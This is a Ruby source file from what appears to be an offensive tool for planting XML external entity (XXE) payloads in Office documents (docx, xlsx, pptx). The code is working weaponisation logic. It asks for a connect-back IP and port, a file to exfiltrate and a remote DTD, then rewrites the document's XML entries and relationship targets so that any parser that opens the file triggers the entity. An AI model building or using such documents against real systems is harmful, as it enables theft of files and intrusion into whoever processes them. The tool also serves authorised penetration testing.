# encoding: ASCII-8BIT
require 'zipruby'
require 'highline/import'
require 'highline'
require 'fileutils'
require 'json'

# This method retrieves the payloads and allows the user to assign a payload
#	that will be used in the document.
def select_payload
	ploads = read_payloads()
	payload = ""
	choose do |menu|
		menu.prompt = "Choose XXE payload:"
		menu.choice "Print XXE Payload Values" do
			i = 0
			ploads.each do |pload|
				i = i +1
				puts "#{i}. #{pload[1][1]} \n\t #{pload[1][0]}"
			end
			exit
		end
		ploads.each do |pload|
			menu.choice pload[0] do payload = pload[1][0] end
		end
	end
	if payload =~ /IP/ and @options["ip"].size == 0
		@options["ip"] = ask("Payload Requires a connect back IP:")
		payload = payload.gsub("IP",@options["ip"])
	end
	if payload =~ /FILE/ and @options["exfiltrate"].size == 0
		@options["exfiltrate"] = ask("Payload Requires a file to check for:")
		payload = payload.gsub("FILE",@options["exfiltrate"])
	end
	if payload =~ /PORT/ and @options["port"].size == 0
		@options["port"] = ask("Payload allows for connect back port to be specified:")
		payload = payload.gsub("PORT",@options["port"])
	end
	if payload =~ /EXF/ and !@options["rf"]
		@options["rf"] = ask("Payload requires a remote file to check for on your server (e.g. /dtd/exfil.dtd):")
		payload = payload.gsub("EXF",@options["rf"])
	end

	return payload
end

# Insert the payload into every XML document in the document
def add_payload_all(fz,payload)
	fz.each do |name|
		add_payload(name, payload)
	end
end

# The menu for selecting the payload and the XML file to insert into
def choose_file(docx)
	fz = list_files(docx)
	payload = select_payload

	puts "|+| #{payload} selected"
	choose do |menu|
		menu.prompt = "Choose File to insert XXE into:"
		menu.choice "Insert Into All Files Creating Multiple OOXML Files" do add_payload_all(fz, payload) end
		menu.choice "Insert Into All Files In Same OOXML File" do add_payload_of(fz, payload,"") end
		menu.choice "Create Entity Canary" do entity_canary(fz, payload) end
		menu.choice "Create XXE 'Content Types' Canary" do entity_canary(fz, payload) end
		fz.each do |name|
			menu.choice name do add_payload(name, payload) end
		end
	end
end

# takes in a docx and returns a list of files
def list_files(docx)
	files = []
	Zip::Archive.open(docx, Zip::CREATE) do |zipfile|
		n = zipfile.num_files # gather entries

		n.times do |i|
			entry_name = zipfile.get_name(i) # get entry name from archive
			files.push(entry_name)
		end
	end
	return files
end

# Create file with simple entity canary
def entity_canary(fz, payload)
	# grab the ext
	ext = @options["file"].split(".").last
	name = "_rels/.rels"
	document = ""

	# place the payload in different file depending on ext
	if ext == "docx"
		payload = payload.gsub("fza","word/document.xml")

		# Read in the XLSX and grab the file
		Zip::Archive.open(@options["file"], Zip::CREATE) do |zipfile|
			zipfile.fopen(name) do |f|
				document = f.read # read entry content
			end
		end

#		puts document.gsub(" "," \n")
		replace = 'Target="word/document.xml"'
		replace1 = 'Target="&canary;"'

		document = document.gsub(replace,replace1)
		docx_xml = payload(document,payload)

		nname = "output_#{Time.now.to_i}_#{name.gsub(".","_").gsub("/","_")}"
		rand_file = "./output/canary_#{nname}.#{ext}"

		puts "|+| Creating #{rand_file}"
		FileUtils::copy_file(@options["file"],rand_file)
		Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
			zipfile.add_or_replace_buffer(name,
								  docx_xml)
		end

	elsif ext == "xlsx"
		payload = payload.gsub("fza","xl/workbook.xml")

		# Read in the XLSX and grab the file
		Zip::Archive.open(@options["file"], Zip::CREATE) do |zipfile|
			zipfile.fopen(name) do |f|
				document = f.read # read entry content
			end
		end

#		puts document.gsub(" "," \n")
		replace = 'Target="xl/workbook.xml"'
		replace1 = 'Target="&canary;"'

		document = document.gsub(replace,replace1)
		docx_xml = payload(document,payload)

		nname = "output_#{Time.now.to_i}_#{name.gsub(".","_").gsub("/","_")}"
		rand_file = "./output/canary_#{nname}.#{ext}"

		puts "|+| Creating #{rand_file}"
		FileUtils::copy_file(@options["file"],rand_file)
		Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
			zipfile.add_or_replace_buffer(name,
								  docx_xml)
		end
	else
		payload = payload.gsub("fza","ppt/presentation.xml")

		# Read in the XLSX and grab the file
		Zip::Archive.open(@options["file"], Zip::CREATE) do |zipfile|
			zipfile.fopen(name) do |f|
				document = f.read # read entry content
			end
		end

#		puts document.gsub(" "," \n")
		replace = 'Target="ppt/presentation.xml"'
		replace1 = 'Target="&canary;"'

		document = document.gsub(replace,replace1)
		docx_xml = payload(document,payload)

		nname = "output_#{Time.now.to_i}_#{name.gsub(".","_").gsub("/","_")}"
		rand_file = "./output/canary_#{nname}.#{ext}"

		puts "|+| Creating #{rand_file}"
		FileUtils::copy_file(@options["file"],rand_file)
		Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
			zipfile.add_or_replace_buffer(name,
								  docx_xml)
		end
	end

end

# Inserts payload into all files
def add_payload_of(fz,payloadx,of)

	# get file ext
	ext = @options["file"].split(".").last
	nname = "output_#{Time.now.to_i}_all"
	rand_file = "./output/#{nname}.#{ext}"
	FileUtils::copy_file(@options["file"],rand_file)

	fz.each do |name|

		document = ""
		# Read in the XLSX and grab the document.xml
		Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
			zipfile.fopen(name) do |f|
				document = f.read # read entry content
			end
		end

		docx_xml = payload(document,payloadx)

		Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
			zipfile.add_or_replace_buffer(name,
									  docx_xml)
		end
	end
	puts "|+| Created #{rand_file}"
end

# The meat of the work:
#	reads in the XML file, inserts XXE and then creates the new OXML
def add_payload(name,payloadx)
	document = ""

	# Read in the XLSX and grab the document.xml
	Zip::Archive.open(@options["file"], Zip::CREATE) do |zipfile|
		zipfile.fopen(name) do |f|
			document = f.read # read entry content
		end
	end
	# get file ext
	ext = @options["file"].split(".").last
	nname = "output_#{Time.now.to_i}_#{name.gsub(".","_").gsub("/","_")}"
	rand_file = "./output/#{nname}.#{ext}"

	docx_xml = payload(document,payloadx)

	puts "|+| Creating #{rand_file}"
	FileUtils::copy_file(@options["file"],rand_file)
	Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
		zipfile.add_or_replace_buffer(name,
								  docx_xml)
	end
end

# The string replacement functionality
def find_string(payloadx, i)
	payloadx = select_payload unless payloadx

	puts "|+| Checking for § in #{@options["file"]}..."

	p payloadx

	targets = []
	Zip::Archive.open(@options["file"], Zip::CREATE) do |zipfile|
		n = zipfile.num_files # gather entries

		n.times do |i|
			nm = zipfile.get_name(i)
			zipfile.fopen(nm) do |f|
				document = f.read # read entry content
				if document =~ /§/
					puts "|+| Found § in #{nm}, replacing with &xxe;"
					targets.push(nm)
				end
			end
		end
	end

	if targets.size == 0
		puts "|-| Could not find § in document, please verify."
		return
	end

	# get file ext
	ext = @options["file"].split(".").last
	nname = "output_#{Time.now.to_i}_all"
	rand_file = "./output/#{nname}_#{i}.#{ext}"
	FileUtils::copy_file(@options["file"],rand_file)

	puts "|+| Inserting into #{rand_file}"

	targets.each do |target|

		document = ""
		# Read in the XLSX and grab the document.xml
		Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
			zipfile.fopen(target) do |f|
				document = f.read # read entry content
			end
		end

		docx_xml = payload(document,payloadx)

		# replace string
		docx_xml = docx_xml.gsub("§","&xxe;")

		Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
			zipfile.add_or_replace_buffer(target,
									  docx_xml)
		end
	end
end

# this does a simple substitution of the [X]XE into the document DOCTYPE.
#	It also resets the xml from standalone "yes" to "no"
def payload(document,payload)
	# insert the payload, TODO this should be refactored
	document = document.gsub('<?xml version="1.0" encoding="UTF-8"?>',"""<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>#{payload.gsub('IP',@options["ip"]).gsub('FILE',@options["exfiltrate"])}""")
	document = document.gsub('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',"""<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>#{payload.gsub('IP',@options["ip"]).gsub('FILE',@options["exfiltrate"])}""")
	return document
end

def list_files_menu(string_replace)
	if(@options["file"].size > 0)
		if File.file?(@options["file"])
			puts "|+| Using #{@options["file"]}"
			if string_replace
				find_string(nil,0)
			else
				choose_file(@options["file"])
			end
		end
		exit
	else
		puts "|+| Using #{@options["file"]}"

		# check if file exists
		if File.file?(@options["file"])
			puts "|+| #{@options["file"]} Loaded\n"
			choose_file(@options["file"])
		else
			puts "|!| #{@options["file"]} cannot be found. Set with -f or modify config.json"
			exit
		end

		if string_replace
			find_string(nil,0)
		end
	end
end


